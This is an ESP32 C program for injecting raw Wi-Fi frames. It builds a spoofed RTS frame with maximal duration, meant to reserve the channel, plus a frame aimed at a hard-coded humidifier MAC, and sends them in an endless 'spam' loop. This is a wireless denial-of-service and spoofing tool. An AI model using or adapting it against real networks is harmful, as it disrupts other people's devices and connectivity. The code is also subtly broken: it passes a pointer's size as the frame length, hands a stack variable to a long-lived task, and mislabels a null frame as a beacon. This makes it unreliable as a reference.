#include "freertos/FreeRTOS.h"

#include "esp_event_loop.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"

#include "nvs_flash.h"
#include "string.h"
#include <stdlib.h>

struct rts_packet
{
	unsigned char fc[2];
	unsigned char duration[2];
	unsigned char ra[6];
	unsigned char ta[6];
	unsigned int fcs;
};

uint8_t beacon_packet[] = {
	// null frame
	0x48, 0x00,							// Frame Control version=0 type=0(management)  subtype=1000 (beacon) fromDS toDS set to 0
	0x00, 0x00,							// Duration
	0xD4, 0xAD, 0xFC, 0x02, 0x7B, 0xAC, // humidifier

	// 0x34, 0x2f, 0xBD, 0xDB, 0x26, 0x54, //switch
	// 0x58, 0x11, 0x22 ,0x27 ,0x55 ,0xA0,  //router
	/*4*/ // xiaomi phone 0x50, 0x8e, 0x49, 0x60, 0x5a, 0x02, //A1 Destination address  broadcast or NaN multicast (51-6f-9a-01-00-00)
	// 0xD4, 0xAD, 0xFC, 0x02, 0x7B, 0xaa,
	/*10*/ 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, // A2 Source address -
	/*16*/ 0xaa, 0xaa, 0xaa, 0xbb, 0xbb, 0xbb, // A3 BSSID
	/*22*/ 0x00, 0x00						   // Seq-ctl


};

uint8_t action_packet[] = {
	0x0d, 0x00, // Frame Control version=0 type=0(management)  subtype=1101 (action) fromDS toDS set to 0
	0x00, 0x00, // Duration
	/*4*/		// 0x51, 0x6f, 0x9a, 0x10, 0x00, 0x00, //A1 router Destination address  broadcast or NaN multicast (51-6f-9a-01-00-00)

	/*10*/ 0x38, 0x10, 0x03, 0x04, 0x05, 0x06, // A2 Source address -
	/*16*/ 0x50, 0x6f, 0x9a, 0x01, 0x02, 0x03, // A3 BSSID
	/*22*/ 0xf0, 0x01,						   // Seq-ctl

	// Frame body starts here
	0x04, 0x09, 0x50, 0x6f, 0x9a, 0x13,									   // Public Action, Vendor specific, Uoi=Wifi Alliance, Oui type
	0x03, 0x09, 0x00, 0x44, 0xc6, 0xf2, 0x0e, 0x42, 0x22, 0x01, 0x00, 0x00 // Service Descriptor
};

// swap these to attempt to send an action frame
#define PKT2SEND beacon_packet
// #define PKT2SEND action_packet

// esp_err_t event_handler(void *ctx, system_event_t *event) {
// 	return ESP_OK;
// }

void spam_task(void *pvParameter)
{
	struct rts_packet *packet = (rts_packet *)pvParameter;
	for (;;)
	{
		vTaskDelay(500 / portTICK_PERIOD_MS);
		printf("SPAM");
		esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	}
}

// Calculate the Ethernet FCS
unsigned int crc32(unsigned char *buf, int len)
{
	unsigned int crc_table[256];
	unsigned int crc = 0xffffffff;
	int i, j;

	// Generate the CRC table
	for (i = 0; i < 256; i++)
	{
		crc_table[i] = i;
		for (j = 0; j < 8; j++)
		{
			if (crc_table[i] & 1)
			{
				crc_table[i] = (crc_table[i] >> 1) ^ 0xedb88320;
			}
			else
			{
				crc_table[i] = crc_table[i] >> 1;
			}
		}
	}

	// Calculate the CRC value
	for (i = 0; i < len; i++)
	{
		crc = crc_table[(crc ^ buf[i]) & 0xff] ^ (crc >> 8);
	}

	// Return the complement of the final CRC value
	return ~crc;
}

// Construct an RTS packet
void construct_rts_packet(unsigned char *ra, unsigned char *ta, struct rts_packet *packet) {
  // Set the Frame Control field (RTS control frame, no subtype)
  packet->fc[0] = 0x04;
  packet->fc[1] = 0x00;
  // Set the Duration/ID field (0xFFFF)
  packet->duration[0] = 0xFF;
  packet->duration[1] = 0xFF;
  // Set the Receiver Address (RA) field (destination MAC address)
  memcpy(packet->ra, ra, 6);
  // Set the Transmitter Address (TA) field (source MAC address)
  memcpy(packet->ta, ta, 6);
  // Calculate the FCS
  packet->fcs = crc32((unsigned char *)packet, sizeof(*packet) - sizeof(packet->fcs));
}

void app_main(void)
{
	nvs_flash_init();
	esp_netif_init();

	wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

	// ESP_ERROR_CHECK(esp_event_loop_run(event_handler, NULL));
	ESP_ERROR_CHECK(esp_wifi_init(&cfg));
	ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

	// Init dummy AP to specify a channel and get WiFi hardware into
	// a mode where we can send the actual fake beacon frames.
	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
	wifi_config_t ap_config = {
		.ap = {
			.ssid = "esp32-beaconspam",
			.ssid_len = 0,
			.password = "dummypassword",
			.channel = 1,
			.authmode = WIFI_AUTH_WPA2_PSK,
			.ssid_hidden = 1,
			.max_connection = 4,
			.beacon_interval = 100000}};

	ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
	ESP_ERROR_CHECK(esp_wifi_start());
	ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

	unsigned char ra[6] = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB};
	unsigned char ta[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x12, 0x34};
	struct rts_packet packet;
	construct_rts_packet(ra, ta, &packet);

	xTaskCreate(&spam_task, "spam_task", 4096, &packet, 5, NULL);
}